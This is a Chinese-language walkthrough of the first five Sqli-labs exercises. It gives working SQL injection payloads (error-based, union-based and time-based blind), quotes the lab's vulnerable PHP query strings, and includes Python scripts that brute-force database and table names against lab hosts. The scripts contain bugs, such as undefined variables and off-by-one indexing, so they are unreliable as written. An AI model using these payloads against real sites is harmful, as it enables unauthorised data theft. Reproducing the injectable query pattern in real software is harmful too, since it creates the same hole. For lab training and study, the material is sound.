# **Sqli_labs解析**

## 第一题（错误的GET单引号字符型注入）又称字符型注入

#### 当输入了?id=1的时候，正常返回内容

![image-20210322104950095](https://github.com/Aapcer/Sqli-lab-1-5wp/blob/main/image/image-20210322104950095.png)



#### 而当输入?id=1'时，会显示报错，观察报错信息，猜测输入的变量ID在语句中放在一个单引号中，我这边是为了方便理解所以将语句显示出来

![image-20210322105131775](.\image-20210322105131775.png)

##### 报错提示为：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

###### 猜测的语句如下：select * from ... where id='$id' ...;

#### 因此这里存在单引号字符型注入，我可以用Mysql中的注释符：--+将后面的单引号号注释掉，然后就可以在里面插入我想要进行的Mysql语句了

##### 构造的PayLoad如下:?id=1' (我想输入的Mysql语句) --+			#注：不要带上括号- -

##### 例如:id=1' union select 1,2,3 --+	#注：这边的union表示的是联合注入，即执行完上一条就执行下一条

##### 上面那条语句给union分成了两句话来执行，一句是前半句，一句是后半句select 1,2,3,后面的--+是注释掉后面的单引号的

#### 但如过像上面那样输入，则会返回当id=1一样的情况

![image-20210322104950095](.\image-20210322104950095.png)

##### 所以我们应当传入一个Mysql数据库里面没有的id值，这样才能执行我们下面的select语句

##### 如：id=0' union select 1,2,3 --+

![image-20210322110341258](.\image-20210322110341258.png)

##### 这边观察到只有2号位和3号位才能返回显示数值，因此我们应当在2，3号位置上输入我们想输入的Mysql语句，这边我们处理3号位 (为什么不在2号位塞语句)

##### PayLoad如下：?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

![image-20210322111905942](.\image-20210322111905942.png)

##### #注：上面设计很多莫名其妙的名称，什么table_name，什么information_schema.tables，这边给下连接可以理解一下这些是什么东西

[Sql注入笔记]: .\Sql注入笔记.md

##### 这样我就可以对数据库进行操作，查询数据库中的数据了

#### 第一题执行Sql命令的源码：

###### $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";	#这边可以看到，的确是把变量放在单引号中

## 第二题(基于错误的GET整型注入)又称数字型注入

#### 情况和第一题差不多，只是不用加分号，首先先尝试上传id=1'，得到以下图片

![image-20210322194702023](.\image-20210322194702023.png)

##### 报错提示为：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

##### 因此猜测是不用输入引号的注入类型，和第一题情况差不多，就是去掉了前面的引号

###### 猜测的语句如下:select * from ... where id=$id ...;		#不带引号

##### 这边推荐比较一下第一题和第二题的区别，观察他们的报错和$sql的区别，以便以后区分

#### 第二题执行Sql命令的源码：

###### $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";	这边可以看到，是把变量直接放在里面了的，所以不用加引号

## 第三题(基于错误的GET单引号变形字符型注入)

#### 情况和第一二题差不多，只是这边需要加’)，首先先尝试上传id=1',得到以下报错信息

![image-20210322195559306](.\image-20210322195559306.png)

##### 报错提示为：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

##### 看到报错后，猜测id变量是存到了单引号和括号中

###### 猜测的语句如下:select * from ... where id=('$id')  ...;

#### 开始注入

##### PayLoad:id=0') union (想要操作的sql语句) --+

##### 基本原理其实和前两题都差不多，都是利用传id用--+把后面的内容注释掉，从而达到可以执行sql语句的效果

#### 第三题执行Sql命令的源码

###### $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";	这边可以看到的确是把变量id传入了一个单引号和括号中，所以我只需要在构造PayLoad的时候加入一个’) 后面再用--+把后面的‘)注释掉，中间插入sql命令就可以了

## 第四题(基于错误的GET双引号字符型注入)

#### 万事开头直接?id=1'，但是居然发现没有报错信息，就特别的神奇

![image-20210322201422480](.\image-20210322201422480.png)

#### 但是根据题目意思，双引号字符型注入，那么改成双引号我试试吧，果然报错了

![image-20210322201556593](.\image-20210322201556593.png)

##### 报错提示为：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1

###### 猜测语句如下:select * from ... where id=("$id") ...;

##### 注入方法同理上一题，就是把单引号改成双引号而已

#### 第四题执行Sql命令的源码：

###### $id = '"' . $id . '"';			#两个单引号中间夹着一个双引号，左右两边都一样

###### $sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";

### 这道题可以来探究一下为什么他的$sql语句中可以双引号里面夹双引号

##### 在PHP语句中双引号串中的内容可以被解释而且替换，而单引号串中的内容总被认为是普通字符

例如： 
$foo = 2; 
echo "foo is $foo"; // 打印结果: foo is 2 		 双引号中的内容解释成了2
echo 'foo is $foo'; // 打印结果: foo is $foo 	单引号就把他当作是$foo输出了
echo "foo is $foo\n"; // 打印结果: foo is 2 (同时换行) 
echo 'foo is $foo\n'; // 打印结果: foo is $foo\n 

##### 就是双引号又转义的功能，而单引号会把里面的当作字符串来处理

再来分析上面的代码$id='"'.$id.'"'单引号里面的直接当作是双引号来处理了，然后再通过.连接起来，最后就得到了让双引号里面放单引号的结果了

还是不明白可以看一下链接

[PHP 单引号与双引号的区别]: https://www.jb51.net/article/21035.htm

## 第五题(双注入GET单引号字符型注入)（盲注）

打开题目开始get一个id=1

![微信截图_20210411211733](.\微信截图_20210411211733.png)

无论输入什么，他都回显的是这个界面，这就是所谓的盲注,输入内容不会回显对应的内容

盲注有两种思路,一种是**时间盲注**，一种是**布尔盲注**,这边我演示的是时间盲注

#### 爆库名长度

PayLoad:/?id=1' and if(length(database())=1,sleep(3),1) --+

length()函数,获取字符串的长度

解析payload,如果database()的长度是等于1的话，那么就睡三秒,不行就跳过

可以F12在网络那一栏看到返回页面的时间长度



![微信截图_20210411213407](.\微信截图_20210411213407.png)

可以看到最下面的load:291毫秒,意思就是传过来用了291毫秒，没有sleep(3)

当我们提交id=1' and if(length(database())=8,sleep(3),1) --+时

返回如下

![微信截图_20210411213545](.\微信截图_20210411213545.png)

睡了3.53秒，那么证明了我们的猜想是正确的，他库的名称长度就是8

#### 爆库名

PayLoad:/?id=1' and if(substr((database()),1,1)='a',sleep(3),1) --+

涉及的Mysql函数

if函数:if(条件,条件成立执行的语句,条件不成立执行的语句)

substr函数:substr((字符串),从字符串的第几个位置,返回多少个值)    #备注:substr((),数字,数字)括号里面的那个括号不要漏掉

这边解析一下payload的意思,如果说截取的database()的第一个字符是a的话，那么就睡三秒钟,不行就跳过

可以F12在网络那一栏看到返回页面的时间长度

![微信截图_20210411212513](.\微信截图_20210411212513.png)

可以看到当提交字符是a的时候，他只睡了**665毫秒**

就是这样，我们可以不断改变所截取的字符与其他26个字母比较，看返回的时间长度是多少，如果大于3秒，则执行了sleep（3），那么我们猜的字符就是正确的（简而言之就是爆破）

![微信截图_20210411212800](.\微信截图_20210411212800.png)

当我们提交到字符是s的时候，他就睡了3.23秒

这样说明，我们爆破出来的数据库的第一个字符就是s

就这样一直爆破，爆破到第8个字符，就可以得到库名是:security

当然，你也可以用python脚本自动爆破，这就需要用到py的request库和time库

这是我自己写的python请求

用的时候记得改url和传上去的参数的名称



```python
import time
import requests

database=''
chars='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
database_length=0#库名长度
#爆破库名长
for l in range(1,20):
    url="http://e46e6c90-daaa-46c6-be9f-79cc102dba64.node3.buuoj.cn/Less-5/?id=1' and if(length(database())={},sleep(3),1)--+"
    payload=url.format(l)
    print(payload)
    start_time1=time.time()
    requests.get(payload)
    if time.time()-start_time1 > 2:
        database_length=l
print(database_length)
#爆破库名
for i in range(database_length):#i是爆破的字段
    for c in chars:#c是用于所比较的字符
        url ='http://e46e6c90-daaa-46c6-be9f-79cc102dba64.node3.buuoj.cn/Less-5/'+"?id=1' and if(substr((database()),"+str(i)+",1)='"+c+"',sleep(3),1)--+"
        print(url)
        start_time = time.time()
        requests.get(url)
        if  time.time() - start_time > 2:
            database+=c
            print(database)
        else:
            pass
print(database)
```

最后爆出来库名是security

#### 爆有几个表

PayLoad:?id=1'and if((select count(*) from information_schema.tables where table_schema='security')=1,sleep(3),1)--+

解析payLoad

select count(*) from information_schema.tables where table_schema='security'

获取information_schema.tables中table_schema='security'里面有几个表

如果表的个数为1,那么就sleep(3),否则就1

```python
import requests
import time
table_num=0
for t in range(1,20):
    url="http://ef9ccd54-bc0a-4b95-9abc-ed15aca1a118.node3.buuoj.cn/Less-5/?id=1'and if((select count(*) from information_schema.tables where table_schema="+"'security'"+")={},sleep(3),1)--+"
    payload=url.format(i)
    print(payload)
    start_time1=time.time()
    requests.get(payload)
    if time.time()-start_time1 > 2:
        table_num=i
print(table_num)
```

#### 爆每个表的表名长度

PayLoad:?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,sleep(3),1)--+"

解析PayLoad：

select table_name from information_schema.tables where table_schema=database() limit 0,1

limt0,1显示出这个表中的第一行的元素内容

如果第一行的长度等于1的话那么就睡三秒钟,否则就跳过

```python
#爆破每个表的表名长度
for i in range(table_num):#范围放table_num			table_num是由多少个表
    url="http://9366390e-56bc-4f55-b47c-5aadaecbeb5b.node3.buuoj.cn/Less-5/?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit "+str(i)+",1))={},sleep(3),1)--+"
    for j in range(1,20):
        payload=url.format(j)
        print(payload)
        start_time1=time.time()
        requests.get(payload)
        if time.time()-start_time1 > 2:
            each_table_length.append(j)
            print(each_table_length)
        else:
            pass
        time.sleep(0.1)#可以改这里面的数值，确保爆破的速度不要太快
print(each_table_length)
```

